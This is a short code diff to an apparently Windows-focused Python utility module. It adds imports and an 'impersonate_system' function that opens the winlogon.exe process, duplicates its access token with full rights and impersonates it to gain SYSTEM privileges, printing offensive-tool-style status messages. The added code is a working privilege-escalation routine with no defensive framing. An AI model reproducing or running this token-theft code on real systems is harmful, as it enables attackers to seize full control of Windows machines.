@@ -21,6 +21,7 @@ import tempfile
 import threading
 import time 
 import ctypes
+import win32api, win32security
 from pathlib import Path
 from typing import Iterable, Optional, Union
 from ctypes import byref, windll, wintypes
@@ -728,3 +729,15 @@ def getppid(pname):
         if not Process32Next(hProcessSnap, ctypes.byref(pe32)): 
          return None
     CloseHandle(hProcessSnap)
+
+
+def impersonate_system(): 
+     try: 
+        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
+        th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
+        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
+        win32security.ImpersonateLoggedOnUser(new_tokenh)
+        print('[+] - Impersonated System Token via Winlogon')
+        win32api.CloseHandle(hp)
+     except Exception as e:
+            print('[x] - Failed To Impersonate System Token via Winlogon')
